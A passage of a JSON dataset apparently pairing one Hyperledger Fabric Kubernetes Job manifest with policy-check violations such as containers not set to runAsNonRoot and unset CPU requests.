name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"joinchannel2\" is not set to runAsNonRoot"
  },
  {
    "id": "9130",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"joinchannel3\" is not set to runAsNonRoot"
  },
  {
    "id": "9131",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"joinchannel4\" is not set to runAsNonRoot"
  },
  {
    "id": "9132",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"joinchannel1\" has cpu request 0"
  },
  {
    "id": "9133",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"joinchannel2\" has cpu request 0"
  },
  {
    "id": "9134",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"joinchannel3\" has cpu request 0"
  },
  {
    "id": "9135",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"joinchannel4\" has cpu request 0"
  },
  {
    "id": "9136",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
